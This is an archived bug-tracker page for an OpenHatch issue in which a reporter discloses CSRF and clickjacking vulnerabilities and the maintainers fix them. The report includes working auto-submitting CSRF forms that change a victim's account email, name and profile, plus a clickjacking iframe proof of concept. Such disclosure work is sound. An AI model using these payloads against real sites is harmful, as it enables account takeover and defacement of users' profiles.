@@ -1,0 +1,934 @@
+<!-- dollarId: issue.item,v 1.4 2001/08/03 01:19:43 richard Exp dollar-->
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
+<html>
+<head>
+<title>
+Issue 917: CSRF and clickjacking vulnerability at openhatch.org - Roundup issue tracker
+
+</title>
+<link rel="stylesheet" type="text/css" href="@@file/style.css">
+<meta http-equiv="Content-Type"
+      content="text/html; charset=utf-8" />
+
+<script type="text/javascript">
+submitted = false;
+function submit_once() {
+    if (submitted) {
+        alert("Your request is being processed.\nPlease be patient.");
+        event.returnValue = 0;    // work-around for IE
+        return 0;
+    }
+    submitted = true;
+    return 1;
+}
+
+function help_window(helpurl, width, height) {
+    HelpWin = window.open('https://openhatch.org/bugs/' + helpurl, 'RoundupHelpWindow', 'scrollbars=yes,resizable=yes,toolbar=no,height='+height+',width='+width);
+}
+</script>
+
+
+
+</head>
+<body class="body">
+
+<table class="body">
+
+<tr>
+ <td class="page-header-left"><a href="/" title="OpenHatch"><img src="/static/images/the-logo-bluegreen-87px.png" width="87" height="60" alt="openhatch" /></a></td>
+ <td class="page-header-top">
+   <div id="body-title">
+     <h2>
+ 
+ 
+ Issue917
+ 
+</h2>
+   </div>
+   <div id="searchbox">
+     <form method="GET" action="issue">
+       <input type="hidden" name="@columns"
+              value="id,activity,title,creator,assignedto,status,milestone" />
+       <input type="hidden" name="@sort" value="activity" />
+       <input type="hidden" name="@group" value="priority" />
+       <input id="search-text" name="@search_text" size="10" />
+       <input type="submit" id="submit" name="submit"
+              value="Search" />
+     </form>
+  </div>
+ </td>
+</tr>
+
+<tr>
+ <td rowspan="2" valign="top" class="sidebar">
+  
+
+  <p class="classblock">
+    <b>This month: 0.13.10</b><br>
+    <a href="/wiki/0.13.10">Goals (in wiki)</a><br>
+    <a href="milestone19?@template=open">Bug list</a>
+  </p>
+
+  <form method="POST" action="https://openhatch.org/bugs/">
+   <p class="classblock">
+    <b>Issues</b><br>
+    
+    <a href="issue?status=-1,1,2,3,4,5,6,7,9,10&amp;@sort=-activity&amp;@search_text=&amp;@columns=id,activity,title,creator,status,milestone&amp;assignedto=-1&amp;@group=priority&amp;@dispname=Show Unassigned&amp;@filter=status,assignedto&amp;@pagesize=50&amp;@startwith=0">Show Unassigned</a><br>
+    <a href="issue?status=-1,1,2,3,4,5,6,7,9,10&amp;@sort=-activity&amp;@search_text=&amp;@dispname=Show All&amp;@filter=status&amp;@group=priority&amp;@columns=id,activity,title,creator,assignedto,status,milestone&amp;@pagesize=50&amp;@startwith=0">Show All</a><br>
+    <a href="issue?status=-1,1,2,3,4,5,6,7,9,10&amp;@sort=-activity&amp;@search_text=&amp;@columns=id,activity,title,creator,assignedto,status,milestone&amp;@dispname=Show Bitesized&amp;keyword=1&amp;@group=priority&amp;@filter=status,keyword&amp;@pagesize=50&amp;@startwith=0">Show Bitesized</a><br>
+    <a href="issue?@template=search">Search</a><br>
+    <input type="submit" class="form-small"
+           value="Show issue:"><input class="form-small" size="4" type="text" name="@number">
+    <input type="hidden" name="@type" value="issue">
+    <input type="hidden" name="@action" value="show">
+   </p>
+  </form>
+
+  
+
+  
+
+  
+
+   <p class="userblock">
+    <b>Login</b><br>
+    <a href="https://openhatch.org/account/login/?next=/bugs/issue917">Click here to login.</a>
+   </p>
+
+  
+  <p class="userblock">
+   <b>Help</b><br>
+   <a href="http://www.roundup-tracker.org/docs.html">Bug tracker docs</a>
+  </p>
+ </td>
+ <td>
+  
+  
+ </td>
+</tr>
+<tr>
+ <td class="content">
+
+
+
+
+
+<div>
+
+<form method="POST" name="itemSynopsis"
+      onsubmit="return submit_once()"
+      enctype="multipart/form-data" action="issue917">
+
+<table class="form">
+<tr>
+ <th class="required">Title</th>
+ <td colspan="3">CSRF and clickjacking vulnerability at openhatch.org</td>
+</tr>
+
+<tr>
+ <th>Milestone</th>
+ <td>later</td>
+ <th class="required">Priority</th>
+ <td>wish</td>
+</tr>
+
+<tr>
+ <th>Waiting On</th>
+ <td>
+  
+  
+  
+ </td>
+ <th>Status</th>
+ <td>need-review</td>
+</tr>
+
+<tr>
+ <th>Superseder</th>
+ <td>
+  
+  
+  
+ </td>
+ <th>Nosy List</th>
+ <td>
+  brittag, bugZPDX, paulproteus, pik4chu
+  <br>
+ </td>
+</tr>
+
+<tr>
+ <th>Assigned To</th>
+ <td>bugZPDX</td>
+ <th>Keywords</th>
+ <td>
+  
+  
+ </td>
+</tr>
+
+
+
+
+
+
+
+</table>
+</form>
+
+
+
+<p>Created on <b>2014-01-11.16:36:45</b> by <b>pik4chu</b>, last changed <b>2014-06-26.04:35:26</b> by <b>ehashman</b>.</p>
+
+<table class="files">
+ <tr><th colspan="5" class="header">Files</th></tr>
+ <tr>
+  <th>File name</th>
+  <th>Uploaded</th>
+  <th>Type</th>
+  <th>Edit</th>
+  <th>Remove</th>
+ </tr>
+ <tr>
+  <td>
+   <a href="file642/unnamed">unnamed</a>
+  </td>
+  <td>
+   <span>pik4chu</span>,
+   <span>2014-01-15.08:47:32</span>
+  </td>
+  <td>text/html</td>
+  <td>
+  </td>
+  <td>
+   
+  </td>
+ </tr>
+ <tr>
+  <td>
+   <a href="file643/unnamed">unnamed</a>
+  </td>
+  <td>
+   <span>pik4chu</span>,
+   <span>2014-01-15.11:46:15</span>
+  </td>
+  <td>text/html</td>
+  <td>
+  </td>
+  <td>
+   
+  </td>
+ </tr>
+ <tr>
+  <td>
+   <a href="file646/unnamed">unnamed</a>
+  </td>
+  <td>
+   <span>pik4chu</span>,
+   <span>2014-01-21.10:25:30</span>
+  </td>
+  <td>text/html</td>
+  <td>
+  </td>
+  <td>
+   
+  </td>
+ </tr>
+ <tr>
+  <td>
+   <a href="file647/unnamed">unnamed</a>
+  </td>
+  <td>
+   <span>pik4chu</span>,
+   <span>2014-01-24.06:16:19</span>
+  </td>
+  <td>text/html</td>
+  <td>
+  </td>
+  <td>
+   
+  </td>
+ </tr>
+ <tr>
+  <td>
+   <a href="file648/unnamed">unnamed</a>
+  </td>
+  <td>
+   <span>pik4chu</span>,
+   <span>2014-01-24.08:42:39</span>
+  </td>
+  <td>text/html</td>
+  <td>
+  </td>
+  <td>
+   
+  </td>
+ </tr>
+ <tr>
+  <td>
+   <a href="file649/unnamed">unnamed</a>
+  </td>
+  <td>
+   <span>pik4chu</span>,
+   <span>2014-01-25.05:08:19</span>
+  </td>
+  <td>text/html</td>
+  <td>
+  </td>
+  <td>
+   
+  </td>
+ </tr>
+ <tr>
+  <td>
+   <a href="file650/unnamed">unnamed</a>
+  </td>
+  <td>
+   <span>pik4chu</span>,
+   <span>2014-01-25.05:08:25</span>
+  </td>
+  <td>text/html</td>
+  <td>
+  </td>
+  <td>
+   
+  </td>
+ </tr>
+ <tr>
+  <td>
+   <a href="file673/unnamed">unnamed</a>
+  </td>
+  <td>
+   <span>pik4chu</span>,
+   <span>2014-04-20.01:57:15</span>
+  </td>
+  <td>text/html</td>
+  <td>
+  </td>
+  <td>
+   
+  </td>
+ </tr>
+ <tr>
+  <td>
+   <a href="file680/unnamed">unnamed</a>
+  </td>
+  <td>
+   <span>pik4chu</span>,
+   <span>2014-05-23.03:49:55</span>
+  </td>
+  <td>text/html</td>
+  <td>
+  </td>
+  <td>
+   
+  </td>
+ </tr>
+</table>
+
+<table class="messages">
+ <tr><th colspan="4" class="header">Messages</th></tr>
+ 
+  <tr>
+   <th><a href="msg4406">msg4406 (view)</a></th>
+   <th>Author: ehashman</th>
+   <th>Date: 2014-06-26.04:35:25</th>
+   <th>
+    
+   </th>
+  </tr>
+  <tr>
+   <td colspan="4" class="content">
+    <pre>As this bug appears to be resolved, and as I am told the stickers are in the
+mail, I am reducing the priority.
+
+I am also changing the status to 'needs-review', blocking on your receipt of the
+stickers. Please set this to 'resolved' when they arrive.</pre>
+   </td>
+  </tr>
+ 
+ 
+  <tr>
+   <th><a href="msg4355">msg4355 (view)</a></th>
+   <th>Author: pik4chu</th>
+   <th>Date: 2014-05-23.03:49:55</th>
+   <th>
+    
+   </th>
+  </tr>
+  <tr>
+   <td colspan="4" class="content">
+    <pre>Hi ???
+how's the sticker?
+
+On Fri, May 23, 2014 at 11:45 AM, bugZPDX &lt;<a href="mailto:bugs@openhatch.org">bugs@openhatch.org</a>&gt; wrote:
+
+&gt;
+&gt; bugZPDX &lt;<a href="mailto:bugz42@gmail.com">bugz42@gmail.com</a>&gt; added the comment:
+&gt;
+&gt; Resolved with PR #247 <a href="https://github.com/openhatch/oh-mainline/pull/247">https://github.com/openhatch/oh-mainline/pull/247</a>
+&gt;
+&gt; ----------
+&gt; status: need-review -&gt; resolved
+&gt;
+&gt; __________________________________________
+&gt; Roundup issue tracker &lt;<a href="mailto:bugs@openhatch.org">bugs@openhatch.org</a>&gt;
+&gt; &lt;<a href="https://openhatch.org/bugs/issue917">https://openhatch.org/bugs/issue917</a>&gt;
+&gt; __________________________________________
+&gt;</pre>
+   </td>
+  </tr>
+ 
+ 
+  <tr>
+   <th><a href="msg4354">msg4354 (view)</a></th>
+   <th>Author: bugZPDX</th>
+   <th>Date: 2014-05-23.03:45:09</th>
+   <th>
+    
+   </th>
+  </tr>
+  <tr>
+   <td colspan="4" class="content">
+    <pre>Resolved with PR #247 <a href="https://github.com/openhatch/oh-mainline/pull/247">https://github.com/openhatch/oh-mainline/pull/247</a></pre>
+   </td>
+  </tr>
+ 
+ 
+  <tr>
+   <th><a href="msg4265">msg4265 (view)</a></th>
+   <th>Author: bugZPDX</th>
+   <th>Date: 2014-04-22.18:14:45</th>
+   <th>
+    
+   </th>
+  </tr>
+  <tr>
+   <td colspan="4" class="content">
+    <pre>Resubmitted pull request after cleanup suggestions
+<a href="https://github.com/openhatch/oh-mainline/pull/247">https://github.com/openhatch/oh-mainline/pull/247</a></pre>
+   </td>
+  </tr>
+ 
+ 
+  <tr>
+   <th><a href="msg4257">msg4257 (view)</a></th>
+   <th>Author: pik4chu</th>
+   <th>Date: 2014-04-20.01:57:15</th>
+   <th>
+    
+   </th>
+  </tr>
+  <tr>
+   <td colspan="4" class="content">
+    <pre>Nice sir.
+But.. How's my gift (the stickers)
+
+On Sunday, April 20, 2014, bugZPDX &lt;<a href="mailto:bugs@openhatch.org">bugs@openhatch.org</a>&gt; wrote:
+
+&gt;
+&gt; bugZPDX &lt;<a href="mailto:bugz42@gmail.com">bugz42@gmail.com</a> &lt;javascript:;&gt;&gt; added the comment:
+&gt;
+&gt; Submitted pull requests. <a href="https://github.com/openhatch/oh-mainline/pull/243">https://github.com/openhatch/oh-mainline/pull/243</a>
+&gt;
+&gt; ----------
+&gt; status: in-progress -&gt; need-review
+&gt;
+&gt; __________________________________________
+&gt; Roundup issue tracker &lt;<a href="mailto:bugs@openhatch.org">bugs@openhatch.org</a> &lt;javascript:;&gt;&gt;
+&gt; &lt;<a href="https://openhatch.org/bugs/issue917">https://openhatch.org/bugs/issue917</a>&gt;
+&gt; __________________________________________
+&gt;</pre>
+   </td>
+  </tr>
+ 
+ 
+  <tr>
+   <th><a href="msg4256">msg4256 (view)</a></th>
+   <th>Author: bugZPDX</th>
+   <th>Date: 2014-04-20.00:26:28</th>
+   <th>
+    
+   </th>
+  </tr>
+  <tr>
+   <td colspan="4" class="content">
+    <pre>Submitted pull requests. <a href="https://github.com/openhatch/oh-mainline/pull/243">https://github.com/openhatch/oh-mainline/pull/243</a></pre>
+   </td>
+  </tr>
+ 
+ 
+  <tr>
+   <th><a href="msg4075">msg4075 (view)</a></th>
+   <th>Author: pik4chu</th>
+   <th>Date: 2014-01-25.05:08:25</th>
+   <th>
+    
+   </th>
+  </tr>
+  <tr>
+   <td colspan="4" class="content">
+    <pre>i mean ma'am !
+
+On Sat, Jan 25, 2014 at 1:08 PM, Jerold Camacho &lt;<a href="mailto:jeroldcamacho.res@gmail.com">jeroldcamacho.res@gmail.com</a>
+&gt; wrote:
+
+&gt; how many stickers sir?
+&gt;
+&gt;
+&gt; On Sat, Jan 25, 2014 at 1:03 PM, brittag &lt;<a href="mailto:bugs@openhatch.org">bugs@openhatch.org</a>&gt; wrote:
+&gt;
+&gt;&gt;
+&gt;&gt; brittag &lt;<a href="mailto:brittag@gmail.com">brittag@gmail.com</a>&gt; added the comment:
+&gt;&gt;
+&gt;&gt; Yes, we can put you on the list for stickers! I'll ask you for an address
+&gt;&gt; over email later, when we're
+&gt;&gt; closer to figuring out logistics for sending stickers. :)
+&gt;&gt;
+&gt;&gt; __________________________________________
+&gt;&gt; Roundup issue tracker &lt;<a href="mailto:bugs@openhatch.org">bugs@openhatch.org</a>&gt;
+&gt;&gt; &lt;<a href="https://openhatch.org/bugs/issue917">https://openhatch.org/bugs/issue917</a>&gt;
+&gt;&gt; __________________________________________
+&gt;&gt;
+&gt;
+&gt;</pre>
+   </td>
+  </tr>
+ 
+ 
+  <tr>
+   <th><a href="msg4074">msg4074 (view)</a></th>
+   <th>Author: pik4chu</th>
+   <th>Date: 2014-01-25.05:08:19</th>
+   <th>
+    
+   </th>
+  </tr>
+  <tr>
+   <td colspan="4" class="content">
+    <pre>how many stickers sir?
+
+On Sat, Jan 25, 2014 at 1:03 PM, brittag &lt;<a href="mailto:bugs@openhatch.org">bugs@openhatch.org</a>&gt; wrote:
+
+&gt;
+&gt; brittag &lt;<a href="mailto:brittag@gmail.com">brittag@gmail.com</a>&gt; added the comment:
+&gt;
+&gt; Yes, we can put you on the list for stickers! I'll ask you for an address
+&gt; over email later, when we're
+&gt; closer to figuring out logistics for sending stickers. :)
+&gt;
+&gt; __________________________________________
+&gt; Roundup issue tracker &lt;<a href="mailto:bugs@openhatch.org">bugs@openhatch.org</a>&gt;
+&gt; &lt;<a href="https://openhatch.org/bugs/issue917">https://openhatch.org/bugs/issue917</a>&gt;
+&gt; __________________________________________
+&gt;</pre>
+   </td>
+  </tr>
+ 
+ 
+  <tr>
+   <th><a href="msg4073">msg4073 (view)</a></th>
+   <th>Author: brittag</th>
+   <th>Date: 2014-01-25.05:03:30</th>
+   <th>
+    
+   </th>
+  </tr>
+  <tr>
+   <td colspan="4" class="content">
+    <pre>Yes, we can put you on the list for stickers! I'll ask you for an address over email later, when we're 
+closer to figuring out logistics for sending stickers. :)</pre>
+   </td>
+  </tr>
+ 
+ 
+  <tr>
+   <th><a href="msg4072">msg4072 (view)</a></th>
+   <th>Author: pik4chu</th>
+   <th>Date: 2014-01-24.08:42:39</th>
+   <th>
+    
+   </th>
+  </tr>
+  <tr>
+   <td colspan="4" class="content">
+    <pre>even a swag or stickers ma'am?
+
+On Fri, Jan 24, 2014 at 4:26 PM, brittag &lt;<a href="mailto:bugs@openhatch.org">bugs@openhatch.org</a>&gt; wrote:
+
+&gt;
+&gt; brittag &lt;<a href="mailto:brittag@gmail.com">brittag@gmail.com</a>&gt; added the comment:
+&gt;
+&gt; Hi Jerold, you're listed on the "thanks" page now:
+&gt; <a href="http://openhatch.readthedocs.org/en/latest/community/thanks.html">http://openhatch.readthedocs.org/en/latest/community/thanks.html</a>
+&gt;
+&gt; __________________________________________
+&gt; Roundup issue tracker &lt;<a href="mailto:bugs@openhatch.org">bugs@openhatch.org</a>&gt;
+&gt; &lt;<a href="https://openhatch.org/bugs/issue917">https://openhatch.org/bugs/issue917</a>&gt;
+&gt; __________________________________________
+&gt;</pre>
+   </td>
+  </tr>
+ 
+ 
+  <tr>
+   <th><a href="msg4071">msg4071 (view)</a></th>
+   <th>Author: brittag</th>
+   <th>Date: 2014-01-24.08:26:07</th>
+   <th>
+    
+   </th>
+  </tr>
+  <tr>
+   <td colspan="4" class="content">
+    <pre>Hi Jerold, you're listed on the "thanks" page now: 
+<a href="http://openhatch.readthedocs.org/en/latest/community/thanks.html">http://openhatch.readthedocs.org/en/latest/community/thanks.html</a></pre>
+   </td>
+  </tr>
+ 
+ 
+  <tr>
+   <th><a href="msg4070">msg4070 (view)</a></th>
+   <th>Author: pik4chu</th>
+   <th>Date: 2014-01-24.06:16:19</th>
+   <th>
+    
+   </th>
+  </tr>
+  <tr>
+   <td colspan="4" class="content">
+    <pre>ma'am Asheesh ?
+you will give a small token of appreciation?
+
+On Fri, Jan 24, 2014 at 9:59 AM, Asheesh Laroia &lt;<a href="mailto:bugs@openhatch.org">bugs@openhatch.org</a>&gt; wrote:
+
+&gt;
+&gt; Asheesh Laroia &lt;<a href="mailto:asheesh@asheesh.org">asheesh@asheesh.org</a>&gt; added the comment:
+&gt;
+&gt; No update yet, we've been very busy, but I hope we'll get to this soon!
+&gt; We're concerned about the impact this can have on users of the site.
+&gt;
+&gt; __________________________________________
+&gt; Roundup issue tracker &lt;<a href="mailto:bugs@openhatch.org">bugs@openhatch.org</a>&gt;
+&gt; &lt;<a href="https://openhatch.org/bugs/issue917">https://openhatch.org/bugs/issue917</a>&gt;
+&gt; __________________________________________
+&gt;</pre>
+   </td>
+  </tr>
+ 
+ 
+  <tr>
+   <th><a href="msg4069">msg4069 (view)</a></th>
+   <th>Author: paulproteus</th>
+   <th>Date: 2014-01-24.01:59:27</th>
+   <th>
+    
+   </th>
+  </tr>
+  <tr>
+   <td colspan="4" class="content">
+    <pre>No update yet, we've been very busy, but I hope we'll get to this soon! 
+We're concerned about the impact this can have on users of the site.</pre>
+   </td>
+  </tr>
+ 
+ 
+  <tr>
+   <th><a href="msg4066">msg4066 (view)</a></th>
+   <th>Author: pik4chu</th>
+   <th>Date: 2014-01-21.10:25:30</th>
+   <th>
+    
+   </th>
+  </tr>
+  <tr>
+   <td colspan="4" class="content">
+    <pre>hello ma'am Britta.. any reply regarding in this issue?
+
+On Wed, Jan 15, 2014 at 7:45 PM, Jerold Camacho &lt;<a href="mailto:jeroldcamacho.res@gmail.com">jeroldcamacho.res@gmail.com</a>
+&gt; wrote:
+
+&gt; <a href="https://docs.djangoproject.com/en/dev/ref/contrib/csrf/">https://docs.djangoproject.com/en/dev/ref/contrib/csrf/</a>
+&gt; <a href="https://docs.djangoproject.com/en/dev/ref/clickjacking/#">https://docs.djangoproject.com/en/dev/ref/clickjacking/#</a>
+&gt;
+&gt;
+&gt; On Wed, Jan 15, 2014 at 4:47 PM, Jerold Camacho &lt;
+&gt; <a href="mailto:jeroldcamacho.res@gmail.com">jeroldcamacho.res@gmail.com</a>&gt; wrote:
+&gt;
+&gt;&gt; Waiting to fixed ..
+&gt;&gt; all you need .. is to put csrf token in every forms.. :)
+&gt;&gt;
+&gt;&gt; hope i'll get any token of appreciation..
+&gt;&gt; Thanks ma'am !
+&gt;&gt;
+&gt;&gt;
+&gt;&gt; On Wed, Jan 15, 2014 at 4:27 PM, Asheesh Laroia &lt;<a href="mailto:bugs@openhatch.org">bugs@openhatch.org</a>&gt;wrote:
+&gt;&gt;
+&gt;&gt;&gt;
+&gt;&gt;&gt; Asheesh Laroia &lt;<a href="mailto:asheesh@asheesh.org">asheesh@asheesh.org</a>&gt; added the comment:
+&gt;&gt;&gt;
+&gt;&gt;&gt; I'm surprised we're not using Django's built-in CSRF protection already!
+&gt;&gt;&gt; pik4chu, thank you for reporting this!
+&gt;&gt;&gt;
+&gt;&gt;&gt; __________________________________________
+&gt;&gt;&gt; Roundup issue tracker &lt;<a href="mailto:bugs@openhatch.org">bugs@openhatch.org</a>&gt;
+&gt;&gt;&gt; &lt;<a href="https://openhatch.org/bugs/issue917">https://openhatch.org/bugs/issue917</a>&gt;
+&gt;&gt;&gt; __________________________________________
+&gt;&gt;&gt;
+&gt;&gt;
+&gt;&gt;
+&gt;</pre>
+   </td>
+  </tr>
+ 
+ 
+  <tr>
+   <th><a href="msg4058">msg4058 (view)</a></th>
+   <th>Author: pik4chu</th>
+   <th>Date: 2014-01-15.11:46:15</th>
+   <th>
+    
+   </th>
+  </tr>
+  <tr>
+   <td colspan="4" class="content">
+    <pre><a href="https://docs.djangoproject.com/en/dev/ref/contrib/csrf/">https://docs.djangoproject.com/en/dev/ref/contrib/csrf/</a>
+<a href="https://docs.djangoproject.com/en/dev/ref/clickjacking/#">https://docs.djangoproject.com/en/dev/ref/clickjacking/#</a>
+
+On Wed, Jan 15, 2014 at 4:47 PM, Jerold Camacho &lt;<a href="mailto:jeroldcamacho.res@gmail.com">jeroldcamacho.res@gmail.com</a>
+&gt; wrote:
+
+&gt; Waiting to fixed ..
+&gt; all you need .. is to put csrf token in every forms.. :)
+&gt;
+&gt; hope i'll get any token of appreciation..
+&gt; Thanks ma'am !
+&gt;
+&gt;
+&gt; On Wed, Jan 15, 2014 at 4:27 PM, Asheesh Laroia &lt;<a href="mailto:bugs@openhatch.org">bugs@openhatch.org</a>&gt;wrote:
+&gt;
+&gt;&gt;
+&gt;&gt; Asheesh Laroia &lt;<a href="mailto:asheesh@asheesh.org">asheesh@asheesh.org</a>&gt; added the comment:
+&gt;&gt;
+&gt;&gt; I'm surprised we're not using Django's built-in CSRF protection already!
+&gt;&gt; pik4chu, thank you for reporting this!
+&gt;&gt;
+&gt;&gt; __________________________________________
+&gt;&gt; Roundup issue tracker &lt;<a href="mailto:bugs@openhatch.org">bugs@openhatch.org</a>&gt;
+&gt;&gt; &lt;<a href="https://openhatch.org/bugs/issue917">https://openhatch.org/bugs/issue917</a>&gt;
+&gt;&gt; __________________________________________
+&gt;&gt;
+&gt;
+&gt;</pre>
+   </td>
+  </tr>
+ 
+ 
+  <tr>
+   <th><a href="msg4056">msg4056 (view)</a></th>
+   <th>Author: pik4chu</th>
+   <th>Date: 2014-01-15.08:47:32</th>
+   <th>
+    
+   </th>
+  </tr>
+  <tr>
+   <td colspan="4" class="content">
+    <pre>Waiting to fixed ..
+all you need .. is to put csrf token in every forms.. :)
+
+hope i'll get any token of appreciation..
+Thanks ma'am !
+
+On Wed, Jan 15, 2014 at 4:27 PM, Asheesh Laroia &lt;<a href="mailto:bugs@openhatch.org">bugs@openhatch.org</a>&gt; wrote:
+
+&gt;
+&gt; Asheesh Laroia &lt;<a href="mailto:asheesh@asheesh.org">asheesh@asheesh.org</a>&gt; added the comment:
+&gt;
+&gt; I'm surprised we're not using Django's built-in CSRF protection already!
+&gt; pik4chu, thank you for reporting this!
+&gt;
+&gt; __________________________________________
+&gt; Roundup issue tracker &lt;<a href="mailto:bugs@openhatch.org">bugs@openhatch.org</a>&gt;
+&gt; &lt;<a href="https://openhatch.org/bugs/issue917">https://openhatch.org/bugs/issue917</a>&gt;
+&gt; __________________________________________
+&gt;</pre>
+   </td>
+  </tr>
+ 
+ 
+  <tr>
+   <th><a href="msg4055">msg4055 (view)</a></th>
+   <th>Author: paulproteus</th>
+   <th>Date: 2014-01-15.08:27:32</th>
+   <th>
+    
+   </th>
+  </tr>
+  <tr>
+   <td colspan="4" class="content">
+    <pre>I'm surprised we're not using Django's built-in CSRF protection already! 
+pik4chu, thank you for reporting this!</pre>
+   </td>
+  </tr>
+ 
+ 
+  <tr>
+   <th><a href="msg4039">msg4039 (view)</a></th>
+   <th>Author: pik4chu</th>
+   <th>Date: 2014-01-11.16:36:45</th>
+   <th>
+    
+   </th>
+  </tr>
+  <tr>
+   <td colspan="4" class="content">
+    <pre>Hey Guys,
+I found vulnerabilty at your site, 
+Cross-site Request Forgery (CSRF) and Clickjacking vulnerability
+
+Description:
+Cross-site request forgery, also known as a one-click attack or session riding
+and abbreviated as CSRF or XSRF, is a type of malicious exploit of a website
+whereby unauthorized commands are transmitted from a user that the website trusts.
+
+Impact:
+The impact of this can be anything from creating new data--which may be an
+outright defacement, contain disinformation or direct users to another malicious
+website--to deleting or altering existing data.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+&lt;html&gt;
+&lt;body onload="javascript:document.forms[0].submit()"&gt;
+  &lt;body&gt;
+    &lt;form action="<a href="http://openhatch.org/account/settings/contact-info/do">http://openhatch.org/account/settings/contact-info/do</a>"
+method="POST"&gt;
+      &lt;input type="hidden" name="edit&amp;#95;email&amp;#45;email"
+value="jeroldcamacho&amp;#46;res&amp;#64;gmail&amp;#46;com" /&gt;
+      &lt;input type="submit" value="Submit form" /&gt;
+    &lt;/form&gt;
+  &lt;/body&gt;
+&lt;/html&gt;
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+&lt;html&gt;
+&lt;body onload="javascript:document.forms[0].submit()"&gt;
+  &lt;body&gt;
+    &lt;form action="<a href="http://openhatch.org/account/settings/edit_name_do">http://openhatch.org/account/settings/edit_name_do</a>" method="POST"&gt;
+      &lt;input type="hidden" name="first&amp;#95;name" value="CSRF" /&gt;
+      &lt;input type="hidden" name="last&amp;#95;name" value="CSRF" /&gt;
+      &lt;input type="hidden" name="username" value="CSRF" /&gt;
+      &lt;input type="submit" value="Submit form" /&gt;
+    &lt;/form&gt;
+  &lt;/body&gt;
+&lt;/html&gt;
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+&lt;html&gt;
+&lt;body onload="javascript:document.forms[0].submit()"&gt;
+  &lt;body&gt;
+    &lt;form action="<a href="http://openhatch.org/people/info/edit/do">http://openhatch.org/people/info/edit/do</a>" method="POST"&gt;
+      &lt;input type="hidden" name="edit&amp;#45;tags&amp;#45;bio"
+value="Cross&amp;#45;site&amp;#32;Request&amp;#32;Forgery" /&gt;
+      &lt;input type="hidden" name="edit&amp;#45;tags&amp;#45;homepage&amp;#95;url" value="" /&gt;
+      &lt;input type="hidden" name="edit&amp;#45;tags&amp;#45;irc&amp;#95;nick" value="" /&gt;
+      &lt;input type="hidden" name="edit&amp;#45;tags&amp;#45;understands" value="" /&gt;
+      &lt;input type="hidden" name="edit&amp;#45;tags&amp;#45;understands&amp;#95;not" value="" /&gt;
+      &lt;input type="hidden" name="edit&amp;#45;tags&amp;#45;studying" value="" /&gt;
+      &lt;input type="hidden" name="edit&amp;#45;tags&amp;#45;can&amp;#95;pitch&amp;#95;in" value="" /&gt;
+      &lt;input type="hidden" name="edit&amp;#45;tags&amp;#45;can&amp;#95;mentor" value="" /&gt;
+      &lt;input type="hidden" name="edit&amp;#45;tags&amp;#45;contact&amp;#95;blurb" value="" /&gt;
+      &lt;input type="submit" value="Submit form" /&gt;
+    &lt;/form&gt;
+  &lt;/body&gt;
+&lt;/html&gt;
+
+to fix the csrf.. you must add auth token in every html forms at your site :)
+
+
+I FOUND CLICKJACKING VULNERABILITY TOO
+~~~~~~~~~~~~~~~~~~~~~
+&lt;html&gt;&lt;style&gt;     iframe { 
+width: 800px; 
+height: 500px; 
+position: absolute; 
+top: 0; left: 0; 
+filter: alpha(opacity=50); 
+opacity: 0.5; 
+}  
+&lt;/style&gt;
+&lt;iframe src="<a href="http://openhatch.org/">http://openhatch.org/</a>"&gt;&lt;/html&gt;</pre>
+   </td>
+  </tr>
+ 
+</table>
+
+<table class="history"><tr><th colspan="4" class="header">
+History
+</th></tr><tr>
+<th>Date</th>
+<th>User</th>
+<th>Action</th>
+<th>Args</th>
+</tr>
+<tr><td>2014-06-26&nbsp;04:35:26</td><td>ehashman</td><td>set</td><td>status: chatting -> need-review<br />priority: critical -> wish<br />messages:
+  + <a href="msg4406">msg4406</a></td></tr>
+<tr><td>2014-05-23&nbsp;03:49:56</td><td>pik4chu</td><td>set</td><td>files:
+  + <a href="file680">unnamed</a><br />status: resolved -> chatting<br />messages:
+  + <a href="msg4355">msg4355</a></td></tr>
+<tr><td>2014-05-23&nbsp;03:45:09</td><td>bugZPDX</td><td>set</td><td>status: need-review -> resolved<br />messages:
+  + <a href="msg4354">msg4354</a></td></tr>
+<tr><td>2014-04-22&nbsp;18:14:45</td><td>bugZPDX</td><td>set</td><td>messages:
+  + <a href="msg4265">msg4265</a></td></tr>
+<tr><td>2014-04-20&nbsp;01:57:15</td><td>pik4chu</td><td>set</td><td>files:
+  + <a href="file673">unnamed</a><br />messages:
+  + <a href="msg4257">msg4257</a></td></tr>
+<tr><td>2014-04-20&nbsp;00:26:28</td><td>bugZPDX</td><td>set</td><td>status: in-progress -> need-review<br />messages:
+  + <a href="msg4256">msg4256</a></td></tr>
+<tr><td>2014-04-14&nbsp;17:43:09</td><td>bugZPDX</td><td>set</td><td>status: testing -> in-progress<br />assignedto: <a href="user1068">bugZPDX</a><br />nosy:
+  + <a href="user1068">bugZPDX</a></td></tr>
+<tr><td>2014-01-25&nbsp;05:08:25</td><td>pik4chu</td><td>set</td><td>files:
+  + <a href="file650">unnamed</a><br />messages:
+  + <a href="msg4075">msg4075</a></td></tr>
+<tr><td>2014-01-25&nbsp;05:08:20</td><td>pik4chu</td><td>set</td><td>files:
+  + <a href="file649">unnamed</a><br />messages:
+  + <a href="msg4074">msg4074</a></td></tr>
+<tr><td>2014-01-25&nbsp;05:03:33</td><td>brittag</td><td>set</td><td>messages:
+  + <a href="msg4073">msg4073</a></td></tr>
+<tr><td>2014-01-24&nbsp;08:42:39</td><td>pik4chu</td><td>set</td><td>files:
+  + <a href="file648">unnamed</a><br />messages:
+  + <a href="msg4072">msg4072</a></td></tr>
+<tr><td>2014-01-24&nbsp;08:26:07</td><td>brittag</td><td>set</td><td>messages:
+  + <a href="msg4071">msg4071</a></td></tr>
+<tr><td>2014-01-24&nbsp;06:16:20</td><td>pik4chu</td><td>set</td><td>files:
+  + <a href="file647">unnamed</a><br />messages:
+  + <a href="msg4070">msg4070</a></td></tr>
+<tr><td>2014-01-24&nbsp;01:59:27</td><td>paulproteus</td><td>set</td><td>messages:
+  + <a href="msg4069">msg4069</a></td></tr>
+<tr><td>2014-01-21&nbsp;10:25:31</td><td>pik4chu</td><td>set</td><td>files:
+  + <a href="file646">unnamed</a><br />messages:
+  + <a href="msg4066">msg4066</a></td></tr>
